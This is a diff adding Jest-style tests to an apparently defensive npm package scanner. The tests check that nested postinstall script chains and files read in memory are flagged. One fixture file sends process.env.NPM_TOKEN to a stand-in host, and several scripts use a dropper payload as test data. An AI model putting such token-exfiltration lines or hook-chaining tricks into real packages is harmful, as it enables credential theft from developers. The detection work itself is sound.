@@ -511,3 +511,33 @@ describe("the shell reading is a third pass: it spends only what the first two l
   });
 });
 
+
+describe("the third pass never costs what fe2e641 read", () => {
+  test("pass 2 keeps fe2e641's ignore-scripts reading: a stricter doubt follows pre and post scripts only in pass 3", () => {
+    const many = Array.from({ length: 220 }, (_, i) => `t${i}`);
+    const scripts = { ...Object.fromEntries(many.map((n) => [n, "true"])), postinstall: "npm run --silent --ignore-scripts a && npm run -s b", a: "true", prea: many.map((n) => `npm run ${n}`).join(" && "), b: DROPPER };
+    const [hook] = expandHooks({ scripts });
+
+    expect(hook?.commands.map((c) => c.from)).toContain("scripts.b (run by scripts.postinstall)");
+    expect(hook?.scripts).toContain("prea");
+  });
+
+  test("an in-memory read with room for the entry and its import reads those before a target only the shell reading finds", () => {
+    const enc = new TextEncoder();
+    const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "node lib/setup.js" } };
+    const pj = file("package.json", JSON.stringify(manifest));
+    const index = file("index.js", "require('./helper.js');\n");
+    const helper = file("helper.js", "require('https').get('https://example.invalid/?t=' + process.env.NPM_TOKEN);\n");
+    const setup = file("lib/setup.js", "1;\n");
+    const a = analyze({ name: "probe-pkg", manifest, files: [pj, index, helper, setup], publisher: "a", previousPublishers: [], maxScannedBytes: pj.size + index.size + helper.size });
+    const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });
+
+    expect(r.signals.flatMap((s) => s.evidence).some((e) => e.startsWith("helper.js:"))).toBe(true);
+  });
+
+  test("a group inside a double-quoted substitution does not end it", () => {
+    expect(expandHooks({ scripts: { postinstall: 'echo "$( (true); npm run \'-s\' payload)"', payload: DROPPER } })[0]?.scripts).toContain("payload");
+  });
+});
+
